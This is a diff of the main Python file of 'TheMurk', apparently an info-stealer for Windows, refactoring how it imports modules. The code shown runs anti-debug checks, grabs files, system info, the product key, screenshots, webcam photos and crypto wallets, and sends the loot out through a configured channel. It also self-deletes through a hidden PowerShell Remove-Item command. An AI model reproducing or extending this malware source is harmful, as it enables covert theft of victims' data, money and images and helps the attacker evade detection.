@@ -1,4 +1,4 @@
-from preferences.config import *
+from preferences.config import config
 from manager.antiDebug import AntiDebug
 from manager.folders import Folders
 from targets.files.files import TxtFiles
@@ -19,9 +19,9 @@ from targets.system.productkey import ProductKey
 from targets.system.photos import Screenshot, WebCam
 from targets.wallets.wallets import Wallets
 from manager.send import Send
-import sys
-import win32com.client
-import os 
+from sys import exit,argv
+from win32com.client import Dispatch
+from os.path import abspath
 
 
 
@@ -39,7 +39,7 @@ class TheMurk:
         self.System()
         self.GrabFiles()
         self.Conclusion()
-        sys.exit()
+        exit()
 
     def Start(self):
         if not config.debuging:
@@ -74,7 +74,7 @@ class TheMurk:
         self.msgInfo[1] += Wallets()
     
     def System(self):
-        self.msgInfo[0] = SystemInfo()
+        self.msgInfo[0] = SystemInfo()#
         ProductKey()
         Screenshot()
         WebCam()
@@ -83,7 +83,7 @@ class TheMurk:
         Send(config.sendData, self.msgInfo)
         
         if config.selfDestruct:
-            script_path = os.path.abspath(sys.argv[0])
-            ps_shell = win32com.client.Dispatch("WScript.Shell")
+            script_path = abspath(argv[0])
+            ps_shell = Dispatch("WScript.Shell")
             command = f"powershell.exe -Command \"Start-Sleep -Seconds 3; Remove-Item -Path '{script_path}' -Force\""
             ps_shell.Run(command, 0, False)
